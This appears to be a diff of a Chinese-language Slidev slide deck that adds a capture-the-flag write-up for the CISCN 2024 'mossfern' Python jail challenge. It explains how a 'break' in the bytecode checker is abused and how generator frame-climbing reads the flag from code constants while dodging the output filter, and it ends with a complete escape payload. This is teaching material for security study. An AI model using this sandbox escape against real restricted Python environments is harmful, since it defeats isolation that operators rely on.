@@ -193,7 +193,7 @@ Python 强大的 <span class="text-orange-500 font-bold">内省 (introspection)<
 
 ---
 
-## 经典利用链：通往 RCE 的万能钥匙
+## 经典利用链
 
 <div class="flex flex-col gap-2 mt-4">
 
@@ -230,7 +230,7 @@ graph LR
 layout: two-cols-header
 ---
 
-## 行动蓝图：过滤器绕过备忘录
+## 绕过备忘录
 
 ::left::
 
@@ -1584,3 +1584,577 @@ graph LR
   </div>
 
 </div>
+
+---
+layout: center
+transition: fade-out
+---
+
+# CISCN 2024 mossfern
+
+Tags: <Tag color="green">Python Jail</Tag>
+
+<style>
+h1 {
+  background-color: #2B90B6;
+  background-image: linear-gradient(45deg, #4EC5D4 10%, #146b8c 20%);
+  background-size: 100%;
+  -webkit-background-clip: text;
+  -moz-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  -moz-text-fill-color: transparent;
+}
+</style>
+
+---
+
+## 题目源码
+
+```python {all}{lines:true, maxHeight:'90%'}
+def source_simple_check(source):
+    """
+    Check the source with pure string in string, prevent dangerous strings
+    :param source: source code
+    :return: None
+    """
+
+    from sys import exit
+    from builtins import print
+
+    try:
+        source.encode("ascii")
+    except UnicodeEncodeError:
+        print("non-ascii is not permitted")
+        exit()
+
+    for i in ["__", "getattr", "exit"]:
+        if i in source.lower():
+            print(i)
+            exit()
+
+
+def block_wrapper():
+    """
+    Check the run process with sys.audithook, no dangerous operations should be conduct
+    :return: None
+    """
+
+    def audit(event, args):
+
+        from builtins import str, print
+        import os
+
+        for i in ["marshal", "__new__", "process", "os", "sys", "interpreter", "cpython", "open", "compile", "gc"]:
+            if i in (event + "".join(str(s) for s in args)).lower():
+                print(i)
+                os._exit(1)
+    return audit
+
+
+def source_opcode_checker(code):
+    """
+    Check the source in the bytecode aspect, no methods and globals should be load
+    :param code: source code
+    :return: None
+    """
+
+    from dis import dis
+    from builtins import str
+    from io import StringIO
+    from sys import exit
+
+    opcodeIO = StringIO()
+    dis(code, file=opcodeIO)
+    opcode = opcodeIO.getvalue().split("\n")
+    opcodeIO.close()
+    for line in opcode:
+        if any(x in str(line) for x in ["LOAD_GLOBAL", "IMPORT_NAME", "LOAD_METHOD"]):
+            if any(x in str(line) for x in ["randint", "randrange", "print", "seed"]):
+                break
+            print("".join([x for x in ["LOAD_GLOBAL", "IMPORT_NAME", "LOAD_METHOD"] if x in str(line)]))
+            exit()
+
+
+if __name__ == "__main__":
+
+    from builtins import open
+    from sys import addaudithook
+    from contextlib import redirect_stdout
+    from random import randint, randrange, seed
+    from io import StringIO
+    from random import seed
+    from time import time
+
+    source = open(f"/app/uploads/THIS_IS_TASK_RANDOM_ID.txt", "r").read()
+    source_simple_check(source)
+    source_opcode_checker(source)
+    code = compile(source, "<sandbox>", "exec")
+    addaudithook(block_wrapper())
+    outputIO = StringIO()
+    with redirect_stdout(outputIO):
+        seed(str(time()) + "THIS_IS_SEED" + str(time()))
+        exec(code, {
+            "__builtins__": None,
+            "randint": randint,
+            "randrange": randrange,
+            "seed": seed,
+            "print": print
+        }, None)
+    output = outputIO.getvalue()
+
+    if "THIS_IS_SEED" in output:
+        print("这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！")
+        print("bad code-operation why still happened ah?")
+    else:
+        print(output)
+```
+
+---
+layout: two-cols
+---
+
+## 根本性缺陷：“玻璃沙箱”
+
+任何试图固在 Python 语言层面实现的沙箱，其本质都如同一个“玻璃沙箱”。它的边界看似清晰，但内部的连接性使其不堪一击。
+
+- **万物皆对象**: 在 Python 中，从整数到函数，一切都是对象。
+- **固有的连接性**: 每个对象都通过 `__class__`, `__base__`, `__subclasses__` 等“双下划线”属性连接到一个庞大的、可遍历的对象层级结构中。
+- **无法实现的封装**: Python 的对象模型没有真正的私有属性或强制封装。这意味着，只要能获得任何一个对象，理论上就可以顺着对象图谱遍历到 Python 解释器的几乎任何部分。
+
+<div class="bg-orange-50 dark:bg-orange-900/10 border-l-4 border-orange-500 p-3 text-sm text-gray-700 dark:text-gray-300">
+防御的重点在于限制「能做什么」，但攻击者利用的是「能访问到什么」。这种固有的可访问性，使得单纯的范围限制形同虚设。
+</div>
+
+::right::
+
+<div class="flex items-center justify-center h-full scale-125">
+
+```mermaid
+graph BT
+    L1("''"):::base -->|\_\_class__| L2("&lt;class 'str'&gt;"):::base
+    L2 -->|\_\_base__| L3("&lt;class 'object'&gt;"):::obj
+    
+    L3 -->|\_\_subclasses__| G1[os]:::gadget
+    L3 --> G2[sys]:::gadget
+    L3 --> G3[subprocess]:::gadget
+    L3 --> G4[FileLoader]:::gadget
+    
+    classDef base fill:#f8fafc,stroke:#94a3b8,color:#475569
+    classDef obj fill:#fff7ed,stroke:#f97316,stroke-width:3px,color:#c2410c,font-weight:bold
+    classDef gadget fill:#fff,stroke:#fdba74,stroke-width:2px,color:#ea580c
+```
+
+</div>
+
+---
+
+## Step 1: 源码分析
+
+<div class="overflow-hidden border border-gray-200 dark:border-gray-700 rounded-lg shadow-sm mt-8">
+  <table class="w-full text-sm">
+    <thead class="bg-gray-50 dark:bg-gray-800 text-gray-900 dark:text-gray-100 font-bold">
+      <tr>
+        <th class="p-4 text-left border-b dark:border-gray-700 w-1/4">防御层</th>
+        <th class="p-4 text-left border-b dark:border-gray-700 w-1/3">精确限制</th>
+        <th class="p-4 text-left border-b dark:border-gray-700">攻击者视角</th>
+      </tr>
+    </thead>
+    <tbody class="divide-y divide-gray-200 dark:divide-gray-700 bg-white dark:bg-gray-900">
+      <!-- Layer 1 -->
+      <tr class="hover:bg-gray-50 dark:hover:bg-gray-800/50">
+        <td class="p-4 flex items-center gap-3">
+          <div class="p-2 bg-blue-100 dark:bg-blue-900/30 rounded-lg text-blue-600 dark:text-blue-400">
+            <div class="i-carbon-code text-xl" />
+          </div>
+          <div>
+            <div class="font-bold text-gray-900 dark:text-gray-100">源码层</div>
+          </div>
+        </td>
+        <td class="p-4 font-mono text-xs text-red-600 dark:text-red-400">
+          ["__", "getattr", "exit"]<br>
+          <span class="text-gray-500 text-[10px]">(不区分大小写)</span>
+        </td>
+        <td class="p-4 text-gray-600 dark:text-gray-300">
+          必须避免使用双下划线方法和 <code>getattr</code>，常规对象属性访问受阻。
+        </td>
+      </tr>
+      <!-- Layer 2 -->
+      <tr class="hover:bg-gray-50 dark:hover:bg-gray-800/50">
+        <td class="p-4 flex items-center gap-3">
+          <div class="p-2 bg-orange-100 dark:bg-orange-900/30 rounded-lg text-orange-600 dark:text-orange-400">
+            <div class="i-carbon-hearing text-xl" />
+          </div>
+          <div>
+            <div class="font-bold text-gray-900 dark:text-gray-100">运行时</div>
+          </div>
+        </td>
+        <td class="p-4 font-mono text-xs text-red-600 dark:text-red-400 break-all">
+          ["process", "os", "sys", "open", "compile"]
+        </td>
+        <td class="p-4 text-gray-600 dark:text-gray-300">
+          任何直接或间接触发这些事件的行为都会导致程序终止。传统 <code>os.system</code> 被封死。
+        </td>
+      </tr>
+      <!-- Layer 3 -->
+      <tr class="hover:bg-gray-50 dark:hover:bg-gray-800/50">
+        <td class="p-4 flex items-center gap-3">
+          <div class="p-2 bg-purple-100 dark:bg-purple-900/30 rounded-lg text-purple-600 dark:text-purple-400">
+            <div class="i-carbon-matrix text-xl" />
+          </div>
+          <div>
+            <div class="font-bold text-gray-900 dark:text-gray-100">字节码层</div>
+          </div>
+        </td>
+        <td class="p-4 font-mono text-xs text-red-600 dark:text-red-400">
+          禁止 `LOAD_GLOBAL`, `IMPORT_NAME`, `LOAD_METHOD`
+        </td>
+        <td class="p-4 text-gray-600 dark:text-gray-300">
+          无法导入模块或访问全局变量。<br>
+          <span class="text-yellow-600 dark:text-yellow-400 font-bold">关键线索</span>: 检查器逻辑中存在一个 <code>break</code> 语句，这是一个潜在的逻辑捷径。
+        </td>
+      </tr>
+      <!-- Layer 4 -->
+      <tr class="hover:bg-gray-50 dark:hover:bg-gray-800/50">
+        <td class="p-4 flex items-center gap-3">
+          <div class="p-2 bg-teal-100 dark:bg-teal-900/30 rounded-lg text-teal-600 dark:text-teal-400">
+            <div class="i-carbon-layers text-xl" />
+          </div>
+          <div>
+            <div class="font-bold text-gray-900 dark:text-gray-100">执行环境</div>
+          </div>
+        </td>
+        <td class="p-4 font-mono text-xs text-red-600 dark:text-red-400">
+          `__builtins__` 为 `None`
+        </td>
+        <td class="p-4 text-gray-600 dark:text-gray-300">
+          失去了所有标准库函数，如 <code>open</code>, <code>__import__</code> 等。
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+---
+layout: two-cols-header
+---
+
+## Step 2：分析逻辑路径
+
+`source_opcode_checker` 的逻辑存在一个潜在的逻辑捷径。
+
+```python {all|4}{lines:true}
+for line in opcode:
+    if any(x in str(line) for x in ["LOAD_GLOBAL", "IMPORT_NAME", "LOAD_METHOD"]):
+        if any(x in str(line) for x in ["randint", "randrange", "print", "seed"]):
+            break
+        print("".join([x for x in ["LOAD_GLOBAL", "IMPORT_NAME", "LOAD_METHOD"] if x in str(line)]))
+        exit()
+```
+
+这里 `break` 成为了一个短路逻辑：只要存在一个白名单内的操作，就会立即退出循环，不会检查后续的行。
+
+```python {all|4}{lines:true}
+try:
+    random.randint(0, 100)
+except:
+    print("bytecode jail bypassed!")
+```
+
+---
+layout: two-cols-header
+---
+
+## Step3: 恢复 `__builtins__`
+
+字节码检查已被绕过，但 `__builtins__` 仍为 `None`。我们无法调用 `open`, `__import__` 等任何标准函数。
+
+::left::
+
+### 对象层级遍历
+
+**原理**: 从一个当前作用域内可用的简单对象（如 `""`, `()`, `{}`）出发，沿着对象继承链向上回溯到顶层的 `object` 类，再向下遍历其所有子类，从而找到并使用被“隐藏”的强大模块和类。
+
+<div class="flex flex-col items-center mt-8">
+    <div class="flex items-center gap-2 mb-2">
+      <div class="i-carbon-earth text-4xl text-blue-600" />
+      <span class="font-bold text-xl">object</span>
+    </div>
+    <!-- Arrow down -->
+    <div class="relative w-full max-w-[300px] h-32">
+        <svg class="absolute inset-0 w-full h-full" style="overflow: visible;">
+             <!-- Main arrow from object to tuple -->
+             <path d="M 150 0 L 80 80" fill="none" stroke="#2563EB" stroke-width="2" marker-end="url(#arrow-blue)" />
+             <!-- Arrow from object to os -->
+             <path d="M 150 0 L 150 80" fill="none" stroke="#2563EB" stroke-width="2" marker-end="url(#arrow-blue)" />
+             <!-- Arrow from object to sys -->
+             <path d="M 150 0 L 220 80" fill="none" stroke="#2563EB" stroke-width="2" marker-end="url(#arrow-blue)" />
+             <!-- Definitions -->
+             <defs>
+                <marker id="arrow-blue" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto" markerUnits="strokeWidth">
+                  <path d="M0,0 L0,6 L5,3 z" fill="#2563EB" />
+                </marker>
+             </defs>
+        </svg>
+        <!-- Tuple Node -->
+        <div class="absolute left-[50px] top-[80px] flex flex-col items-center">
+             <div class="border-2 border-blue-500 rounded px-2 py-1 bg-white dark:bg-gray-800 text-sm font-mono">tuple</div>
+             <!-- Up arrow from () -->
+             <div class="flex flex-col items-center mt-2">
+                 <div class="i-carbon-arrow-up text-gray-400" />
+                 <span class="text-xs font-mono">()</span>
+             </div>
+        </div>
+        <!-- OS Node -->
+        <div class="absolute left-[130px] top-[80px] flex flex-col items-center">
+             <div class="i-carbon-settings text-2xl text-blue-600" />
+             <span class="text-sm font-mono">os</span>
+        </div>
+         <!-- Sys Node -->
+        <div class="absolute left-[200px] top-[80px] flex flex-col items-center">
+             <div class="i-carbon-chip text-2xl text-blue-600" />
+             <span class="text-sm font-mono">sys</span>
+        </div>
+    </div>
+    <div class="w-full max-w-[300px] mt-4 flex justify-between text-xs text-gray-500 font-mono">
+        <span>__class__</span>
+        <span>__base__</span>
+        <span>__subclasses__()</span>
+    </div>
+</div>
+
+::right::
+
+### 2. 栈帧回溯 (Frame Climbing)
+
+**原理**: 利用函数调用栈 (Call Stack) 的结构。通过访问当前执行帧 (Frame) 的 `f_back` 属性，可以回溯到调用者的帧，从而访问其局部变量、全局变量，甚至是代码对象。
+
+<div class="flex flex-col gap-2  ml-8 relative max-w-[300px]">
+    <!-- Current Frame -->
+    <div class="bg-blue-50 dark:bg-blue-900/20 border-2 border-blue-200 dark:border-blue-800 rounded p-3 flex items-center gap-3 relative z-10">
+        <div class="i-carbon-touch-1 text-2xl text-blue-600" />
+        <span class="font-mono font-bold">current_frame</span>
+    </div>
+    <!-- Arrow Up 1 -->
+    <div class="absolute right-[-30px] top-[25px] h-[75px] w-[20px] border-r-2 border-orange-400 rounded-r-lg" style="border-top: 2px solid #fb923c; border-bottom: 0;"></div>
+    <div class="absolute right-[-60px] top-[20px] text-xs font-mono text-orange-500 bg-white dark:bg-[#121212] px-1">f_back</div>
+    <!-- Arrow Head -->
+    <div class="absolute right-[292px] top-[95px] w-0 h-0 border-t-[6px] border-t-transparent border-b-[6px] border-b-transparent border-r-[8px] border-r-orange-400"></div>
+    <!-- Exec Frame -->
+    <div class="bg-blue-100 dark:bg-blue-900/40 border-2 border-blue-300 dark:border-blue-700 rounded p-3 flex items-center gap-3 relative z-10 mt-6">
+        <div class="i-carbon-settings-check text-2xl text-blue-700" />
+        <span class="font-mono font-bold">exec_frame</span>
+    </div>
+    <!-- Arrow Up 2 -->
+    <div class="absolute right-[-30px] top-[115px] h-[75px] w-[20px] border-r-2 border-orange-400 rounded-r-lg" style="border-top: 2px solid #fb923c; border-bottom: 0;"></div>
+    <div class="absolute right-[-60px] top-[110px] text-xs font-mono text-orange-500 bg-white dark:bg-[#121212] px-1">f_back</div>
+    <!-- Caller Frame -->
+    <div class="bg-blue-200 dark:bg-blue-900/60 border-2 border-blue-400 dark:border-blue-600 rounded p-3 flex items-center gap-3 relative z-10 mt-6">
+        <div class="i-carbon-user-identification text-2xl text-blue-800" />
+        <span class="font-mono font-bold">caller_frame</span>
+    </div>
+</div>
+
+---
+layout: two-cols-header
+---
+
+## 利用生成器进行栈帧回溯
+
+- Why Generators?
+  - 当一个生成器被执行并暂停时（如通过 `yield`），它的执行状态被保存在一个帧对象中，即 `gi_frame`。
+  - 关键在于，这个 `gi_frame` 的 `f_back` 属性（指向其调用者）是存在的且非 `None`。这为我们提供了回溯的起点。
+
+::left::
+
+Payload Core Code
+
+```python {all|1-8|9-13|15-18|all}{lines:true, maxHeight:'60%'}
+g = None
+def gen_access():
+    global g
+    yield 1 # 暂停点
+    f = g.gi_frame
+    # 向上回溯两层，到达 runner 的帧
+    if f.f_back and f.f_back.f_back:
+        runner_frame = f.f_back.f_back
+        # ... 在这里访问 runner_frame ...
+
+g = gen_access()
+g.send(None) # 启动生成器
+g.send(None) # 从 yield 恢复，执行帧回溯
+```
+
+::right::
+
+<div class="flex flex-col items-center justify-center h-full">
+
+```mermaid
+graph BT
+    subgraph RunnerFrame ["runner.py 主程序帧"]
+        direction BT
+        
+        subgraph ExecFrame ["exec() 函数帧"]
+            direction BT
+            
+            GenNode["gen_access 生成器帧"]
+        end
+    end
+    
+    GenNode -->|f_back| ExecFrame
+    ExecFrame -->|f_back| RunnerFrame
+    
+    style RunnerFrame fill:#eff6ff,stroke:#bfdbfe,stroke-width:2px,color:#1e40af
+    style ExecFrame fill:#dbeafe,stroke:#60a5fa,stroke-width:2px,color:#1d4ed8
+    style GenNode fill:#ffffff,stroke:#93c5fd,stroke-width:2px,color:#334155
+
+    linkStyle 0,1 stroke:#d97706,stroke-width:4px,fill:none
+```
+
+<div class="flex items-center gap-2 text-amber-600 dark:text-amber-500 font-bold mt-4">
+    <div class="i-carbon-checkmark-outline text-xl"></div>
+    <span>成功“越狱”到沙箱之外</span>
+</div>
+
+</div>
+
+---
+layout: two-cols-header
+---
+
+## 从代码常量中直接提取 Flag
+
+- A Smarter Idea
+  - 我们已经可以访问 `runner.py` 的帧 (`runner_frame`)。
+  - 虽然可以通过 `runner_frame.f_builtins` 恢复完整的 `__builtins__`，但这可能会触发审计钩子。
+  - 有没有一种方法，不需要恢复 builtins，也不需要调用任何敏感函数，就能拿到 Flag？
+
+::left::
+
+- 每个帧对象都有一个 `f_code` 属性，它指向该帧对应的代码对象。
+- 代码对象中有一个 `co_consts` 属性，它是一个元组，包含了该代码块中使用的所有常量。
+
+在 `runner.py` 中，Flag 字符串被硬编码到源码中，因此必然存在于主程序帧的 `f_code.co_consts` 中！
+
+```python
+# (续上页)
+consts = f.f_back.f_back.f_code.co_consts
+for c in consts:
+    # c 就是常量池中的一个常量，其中一个就是 Flag
+    # ... 接下来要想办法把它打印出来 ...
+```
+
+::right::
+
+<div class="flex flex-col items-center justify-center h-full scale-60">
+
+```mermaid
+graph TD
+    RunnerFrame["runner_frame"]
+    CodeObj["Code Object"]
+    Consts["( None, 100, 'THIS_IS_SEED', '{flag{...}}' )"]:::consts
+
+    RunnerFrame -->|f_code| CodeObj
+    CodeObj -->|co_consts| Consts
+
+    style RunnerFrame fill:#eff6ff,stroke:#1d4ed8,stroke-width:2px,color:#1e40af
+    style CodeObj fill:#eff6ff,stroke:#1d4ed8,stroke-width:2px,color:#1e40af
+    classDef consts fill:#dbeafe,stroke:#1e40af,stroke-width:2px,color:#1e3a8a,font-family:monospace
+```
+
+<div class="flex justify-end w-full mt-2 pr-8 text-sm font-bold text-amber-600">
+    <div class="i-carbon-arrow-up text-xl animate-bounce mr-2"></div>
+    目标 Flag (Target Flag)
+</div>
+
+</div>
+
+---
+layout: two-cols-header
+---
+
+## Step 4: 绕过输出审查
+
+- `runner.py` 的代码会检查输出内容，如果包含原始的 Flag 字符串，则会屏蔽输出。
+
+<div class="bg-gray-100 dark:bg-gray-800 p-2 rounded border border-gray-200 dark:border-gray-700 text-sm font-mono mt-2">
+  if "THIS_IS_SEED" in output:<br/>
+  &nbsp;&nbsp;print("bad code-operation ...")<br/>
+  else:<br/>
+  &nbsp;&nbsp;print(output)
+</div>
+
+在 **Payload** 阶段，我们通过 `co_consts` 获取到了 Flag 字符串，但直接打印会被拦截。
+
+::left::
+
+```python
+# (续上页)
+# 对数据进行编码或变换，使其在输出时不匹配原始 Flag 字符串。
+consts = f.f_back.f_back.f_code.co_consts
+for c in consts:
+    try:
+        # 尝试反转并打印，用 REV:: 作为标记
+        print("REV::" + c[::-1])
+    except:
+        pass # 忽略非字符串常量
+```
+
+::right::
+
+<div class="flex flex-col items-center justify-center h-full gap-4 scale-70">
+
+<div class="text-sm text-gray-600 dark:text-gray-400">
+  反转一个反转，将得到的字符串发出：
+</div>
+
+<div class="w-full bg-[#1e1e1e] text-white p-3 rounded-lg shadow-lg font-mono text-sm relative">
+  <div class="flex gap-1.5 absolute top-3 left-3">
+    <div class="w-2.5 h-2.5 rounded-full bg-[#ff5f56]"></div>
+    <div class="w-2.5 h-2.5 rounded-full bg-[#ffbd2e]"></div>
+    <div class="w-2.5 h-2.5 rounded-full bg-[#27c93f]"></div>
+  </div>
+  <div class="mt-4 pt-2 break-all font-mono">
+    > REV::}6ef5aea0dbb4-2619-0314-8c1d-b64260ae{galf
+  </div>
+</div>
+
+<div class="flex flex-col items-center">
+    <div class="i-carbon-arrow-down text-4xl text-orange-500 animate-bounce"></div>
+    <span class="text-xs font-bold text-gray-500">本地反转</span>
+</div>
+
+<div class="bg-orange-100 dark:bg-orange-900/30 border border-orange-300 dark:border-orange-700 text-orange-800 dark:text-orange-200 px-4 py-2 rounded font-mono font-bold text-center w-full break-all">
+  flag{ea06246b-d1c8-4130-9162-4bbd0aea5fe6}
+</div>
+
+</div>
+
+---
+
+## 完整 Payload
+
+```python
+try:
+    # 1) Break opcode checker: LOAD_METHOD + "randint" on one line.
+    random.randint(0, 100)
+except:
+    print("bytecode jail bypassed!")
+g = None
+def gen_access():
+    global g
+    yield 1
+    f = g.gi_frame
+    if f.f_back and f.f_back.f_back:
+        consts = f.f_back.f_back.f_code.co_consts
+        for c in consts:
+            try:
+                print("REV::" + c[::-1])
+            except:
+                pass
+g = gen_access()
+g.send(None) # start
+try:
+    g.send(None) # resume: executes frame walk + exfil
+except:
+    pass
+```
